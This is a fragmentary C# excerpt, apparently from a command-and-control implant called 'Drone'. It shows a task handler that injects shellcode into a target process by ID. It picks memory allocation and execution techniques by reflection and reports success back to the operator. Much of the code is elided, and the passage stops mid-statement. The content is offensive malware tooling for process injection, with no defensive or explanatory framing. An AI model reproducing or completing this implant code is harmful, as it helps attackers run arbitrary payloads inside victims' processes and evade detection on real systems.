...
using Drone.Models;
using StandardModule.Invocation.Injection;
...
public partial class StandardApi
{
    private void ShellcodeInject(DroneTask task, CancellationToken token)
    {
        ...
        if (success)
            Drone.SendResult(task.TaskGuid, $"Successfully injected {shellcode.Length} bytes into {processName}");
    ...
    private bool InjectShellcode(int pid, byte[] shellcode, out string processName)
    {
        ...
        var allocationTechnique = (from type in types
            where type.Name.Contains(allocType)
            select (AllocationTechnique)Activator.CreateInstance(type)).FirstOrDefault();

        var executionTechnique = (from type in types
            where type.Name.Contains(execType)
